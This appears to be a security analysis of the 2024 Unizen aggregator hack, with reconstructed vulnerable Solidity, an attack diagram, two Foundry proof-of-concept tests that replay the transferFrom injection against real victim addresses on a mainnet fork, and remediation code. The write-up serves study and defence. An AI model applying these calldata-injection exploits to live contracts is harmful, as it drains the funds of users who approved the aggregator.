# Unizen — Unvalidated External Call Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2024-03-08 |
| **Protocol** | Unizen (UnizenIO) |
| **Chain** | Ethereum, Polygon |
| **Loss** | $2,800,000 |
| **Attacker** | [0x2aD8aed847e8d4D3da52AaBB7d0f5c25729D10df](https://etherscan.io/address/0x2ad8aed847e8d4d3da52aabb7d0f5c25729d10df) |
| **Vulnerable Contract** | [Unizen Trade Aggregator Proxy](https://etherscan.io/address/0xd3f64baa732061f8b3626ee44bab354f854877ac) |
| **Attack Tx (1)** | [0x923d1d63...](https://app.blocksec.com/explorer/tx/eth/0x923d1d63a1165ebd3521516f6d22d015f2e1b4b22d5dc954152b6c089c765fcd) |
| **Attack Tx (2)** | [0xdd0636e2...](https://app.blocksec.com/explorer/tx/eth/0xdd0636e2598f4d7b74f364fedb38f334365fd956747a04a6dd597444af0bc1c0) |
| **Root Cause** | Unvalidated calldata external call in `trade()` function used to steal user tokens |
| **Reference Analysis** | [SlowMist](https://twitter.com/SlowMist_Team/status/1766311510362734824), [Phalcon](https://twitter.com/Phalcon_xyz/status/1766274000534004187), [Ancilia](https://twitter.com/AnciliaInc/status/1766261463025684707) |

---

## 1. Vulnerability Overview

Unizen is a trade aggregator protocol that aggregates multiple DEXes. Users grant token allowances to Unizen's smart contract, and Unizen internally executes swaps through the optimal DEX route.

**Core Vulnerability**: Trade functions such as `tradeWithNativeSwap()` / `tradeWithExactInput()` trusted the `call` data (target address, calldata) used when calling external DEX contracts **exactly as provided by user input**, executing them without any validation.

The attacker exploited this vulnerability by injecting the following malicious calldata:
- **target**: The ERC-20 token contract to which the victim had granted an allowance
- **data**: `transferFrom(victim, attacker, balance)` — transfers the victim's tokens to the attacker's wallet

Since the Unizen contract had already received `approve` from the victim for the relevant token, the `transferFrom` call succeeded and the victim's funds were immediately stolen.

---

## 2. Vulnerable Code Analysis

### 2-1. Vulnerable Function Structure (Reconstructed)

```solidity
struct Info {
    address to;          // Recipient (attacker specifies their own address)
    address token;       // Input token
    uint256 amount;
    string uuid;
    uint256 apiId;
    uint256 userPSFee;
    // ...
}

struct Call {
    address target;      // External call target address (no validation!)
    uint256 amount;
    bytes data;          // External call calldata (no validation!)
}

// selector: 0x1ef29a02
function trade(Info memory info, Call[] memory calls) external payable {
    // ...
    for (uint i = 0; i < calls.length; i++) {
        // Critical flaw: calls[i].target and calls[i].data are not validated
        (bool success, ) = calls[i].target.call{value: calls[i].amount}(calls[i].data);
        require(success, "call failed");
    }
    // ...
}
```

### 2-2. Actual Attack Calldata Breakdown (PoC-based)

```solidity
// Malicious Call struct injected by the attacker:
Call memory maliciousCall = Call({
    target: address(VRA_TOKEN),          // ERC-20 token address
    amount: 0,
    data: abi.encodeWithSignature(
        "transferFrom(address,address,uint256)",
        tokenHolder,             // Victim (user who approved Unizen)
        address(TradeAggregator), // Unizen contract (acts as msg.sender)
        VRA.balanceOf(tokenHolder) // Victim's entire balance
    )
});
```

**Why does this succeed?**

1. The victim has `approve`d the Unizen contract to spend their VRA tokens
2. The Unizen contract directly calls `VRA.transferFrom(victim, attacker, balance)`
3. From the ERC-20's perspective, `msg.sender` is the Unizen contract → allowance condition is satisfied
4. Tokens are transferred from the victim to the attacker

---

## 3. Attack Flow (ASCII Diagram)

```
Attacker (EOA: 0x2aD8...)
    │
    │  trade(info, [maliciousCall])  +  1 wei
    │  ─────────────────────────────────────────►
    │                                   Unizen Trade Aggregator Proxy
    │                                   (0xd3f64BAa...)
    │                                       │
    │                                       │  Executes external call without validation
    │                                       │
    │                                       │  calls[0].target.call(calls[0].data)
    │                                       │  ────────────────────────────────►
    │                                       │                 ERC-20 Token Contract
    │                                       │                 (VRA / DMTR / ...)
    │                                       │
    │                                       │  transferFrom(victim, aggregator, amount)
    │                                       │  ◄────────────────────────────────────
    │                                       │         [allowance: victim → aggregator]
    │                                       │
    │◄──────────────────────────────────────│
    │         Receives token balance (info.to = attacker)
    │
    ▼
Victim's tokens credited to attacker's wallet

[Victim Relationship Diagram]
Victim address ──approve──► Unizen Aggregator Proxy
Victim address ◄──transferFrom─── Unizen Aggregator Proxy (executes attacker-injected calldata)
```

**Attack Step Summary**:

```
① Attacker → calls Unizen.trade()
        ↓
② Unizen iterates over attacker-supplied calls[] array as-is
        ↓
③ calls[0] = { target: VRA token, data: transferFrom(victim→attacker) }
        ↓
④ Unizen executes VRA.transferFrom(victim, attacker, full balance)
        ↓
⑤ All of the victim's VRA tokens are transferred to the attacker
        ↓
⑥ Repeated across multiple victims / multiple tokens → $2.8M loss
```

---

## 4. PoC Code

### UnizenIO_exp.sol (Ethereum, DMTR Token)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~2M USD$
// Attacker : https://etherscan.io/address/0x2ad8aed847e8d4d3da52aabb7d0f5c25729d10df
// Vulnerable Contract : (Unizen: Trade Aggregator Proxy)
//   https://etherscan.io/address/0xd3f64baa732061f8b3626ee44bab354f854877ac
// Attack Tx :
//   https://app.blocksec.com/explorer/tx/eth/0x923d1d63a1165ebd3521516f6d22d015f2e1b4b22d5dc954152b6c089c765fcd

contract UniZenIOTest is Test {
    address victim = address(0x7feAeE6094B8B630de3F7202d04C33f3BDC3828a);
    address attacker = address(0x2aD8aed847e8d4D3da52AaBB7d0f5c25729D10df);
    address aggregator_proxy = address(0xd3f64BAa732061F8B3626ee44bab354f854877AC);
    IERC20 DMTR = IERC20(0x51cB253744189f11241becb29BeDd3F1b5384fdB);

    function setUp() public {
        vm.createSelectFork("mainnet", 19_393_769);
        emit log_named_uint(
            "Before attack, victim DMTR amount (in ether)",
            DMTR.balanceOf(victim) / 1 ether
        );
    }

    function testExploit() public {
        vm.startPrank(attacker);
        // Encoded calldata:
        // - selector: 0x1ef29a02 (trade function)
        // - info.to: attacker address
        // - info.token: DMTR token
        // - calls[0].target: DMTR token address
        // - calls[0].data: transferFrom(victim, aggregator, balance)
        aggregator_proxy.call{value: 1}(
            hex"1ef29a02..."
        );
        emit log_named_uint(
            "After attack, victim DMTR amount (in ether)",
            DMTR.balanceOf(victim) / 1 ether
        );
    }
}
```

### UnizenIO2_exp.sol (Ethereum, VRA Token — Explicit Struct Version)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

interface ITradeAggregator {
    struct Info {
        address to;
        uint256 structMember2;
        address token;
        uint256 structMember3;
        uint256 structMember4;
        uint256 structMember5;
        string uuid;
        uint256 apiId;
        uint256 userPSFee;
    }

    struct Call {
        address target;   // ← External call target (unvalidated)
        uint256 amount;
        bytes data;       // ← External call calldata (unvalidated)
    }
}

contract ContractTest is Test {
    ITradeAggregator private constant TradeAggregator =
        ITradeAggregator(0xd3f64BAa732061F8B3626ee44bab354f854877AC);
    IERC20 private constant VRA = IERC20(0xF411903cbC70a74d22900a5DE66A2dda66507255);
    address private constant tokenHolder = 0x12fe4bC7D0B969055F763C5587F2ED0cA1b334f3;

    function setUp() public {
        vm.createSelectFork("mainnet", 19_393_360);
    }

    function testExploit() public {
        // Malicious Call: VRA.transferFrom(tokenHolder → aggregator, full balance)
        bytes memory callData = abi.encodeWithSignature(
            "transferFrom(address,address,uint256)",
            tokenHolder,
            address(TradeAggregator),
            VRA.balanceOf(tokenHolder)
        );

        ITradeAggregator.Call memory call = ITradeAggregator.Call({
            target: address(VRA),
            amount: 0,
            data: callData       // transferFrom injection
        });

        ITradeAggregator.Call[] memory calls = new ITradeAggregator.Call[](1);
        calls[0] = call;

        ITradeAggregator.Info memory info = ITradeAggregator.Info({
            to: address(this),  // Attacker address set as recipient
            structMember2: 0,
            token: address(VRA),
            structMember3: 1,
            structMember4: 0,
            structMember5: 186_783_104_413_296_096,
            uuid: "UNIZEN-CLI",
            apiId: 17,
            userPSFee: 1875
        });

        bytes memory data = abi.encodeWithSelector(bytes4(0x1ef29a02), info, calls);
        (bool success,) = address(TradeAggregator).call{value: 1 wei}(data);
        require(success, "Call to TradeAggregator not successful");
    }
}
```

---

## 5. Vulnerability Classification

| Category | Details |
|-----------|------|
| **CWE** | CWE-20: Improper Input Validation |
| **Attack Vector** | Arbitrary External Call via unvalidated user-supplied calldata |
| **Attack Precondition** | Victim has already `approve`d ERC-20 tokens to the Unizen contract |
| **DASP Classification** | Not #1 Reentrancy; Unchecked External Call / Access Control issue |
| **Similar Incidents** | SocketGateway (2024-01-16), Seneca Protocol (2024-02-28) |
| **Attack Cost** | 1 wei (effectively free) |
| **Skill Difficulty** | Low — reproducible with only calldata encoding knowledge |

---

## 6. Remediation Recommendations

### 6-1. Whitelist-Based External Call Restriction (Required)

```solidity
mapping(address => bool) public approvedDEXes;

modifier onlyApprovedTarget(address target) {
    require(approvedDEXes[target], "Target not whitelisted");
    _;
}

function trade(Info memory info, Call[] memory calls) external payable {
    for (uint i = 0; i < calls.length; i++) {
        require(approvedDEXes[calls[i].target], "Unauthorized call target");
        (bool success, ) = calls[i].target.call{value: calls[i].amount}(calls[i].data);
        require(success, "DEX call failed");
    }
}
```

### 6-2. Dangerous Function Selector Blacklist (Supplementary Defense)

```solidity
function _validateCalldata(bytes memory data) internal pure {
    if (data.length < 4) return;
    bytes4 selector = bytes4(data);
    // Block token transfer functions such as transferFrom, transfer
    require(selector != IERC20.transferFrom.selector, "transferFrom not allowed");
    require(selector != IERC20.transfer.selector, "transfer not allowed");
    require(selector != IERC20.approve.selector, "approve not allowed");
}
```

### 6-3. Call Target Type Validation

```solidity
// Verify that the external call target is a validated contract, not an EOA
function _isContract(address addr) internal view returns (bool) {
    uint256 size;
    assembly { size := extcodesize(addr) }
    return size > 0;
}
```

### 6-4. Security Audit and Operational Recommendations

- Always validate that the `target` address is a whitelisted DEX router before making any external call
- Never trust any field of the user-supplied `Call[]` struct
- Mandatory professional security audit before contract deployment
- Implement an emergency pause mechanism for rapid response when an incident occurs

---

## 7. Lessons Learned

### 7-1. The Danger of "Trust Without Verification"

The aggregator pattern is inherently a structure that relays calls to external contracts. When the **target** and **calldata** of those external calls are left entirely to user input, the contract itself becomes a general-purpose attack tool. Unizen overlooked this risk.

### 7-2. Aggregator Allowances Are High-Value Targets

The aggregate balance of users who have granted `approve` to a DEX aggregator is enormous. For this reason, aggregator contracts must be designed as **security fortresses** that go far beyond simple trading logic.

### 7-3. Recurrence of Similar Vulnerabilities

| Date | Protocol | Loss | Common Factor |
|------|----------|------|--------|
| 2024-01-16 | SocketGateway | $3.3M | Unvalidated external call |
| 2024-02-28 | Seneca Protocol | $6.5M | Unvalidated external call |
| 2024-03-08 | Unizen | $2.8M | Unvalidated external call |

This is a case of the same vulnerability being repeatedly exploited within a short period. It highlights the need for ecosystem-wide security pattern sharing and standardized audit checklists.

### 7-4. Key Takeaway Summary

> **"Every external call a contract executes on behalf of others carries the same responsibility as an action the contract performs directly."**
>
> When constructing external call paths from user input, whitelist validation is absolutely mandatory. In particular, on contracts that receive ERC-20 allowances, an unvalidated external call can directly lead to complete fund drainage.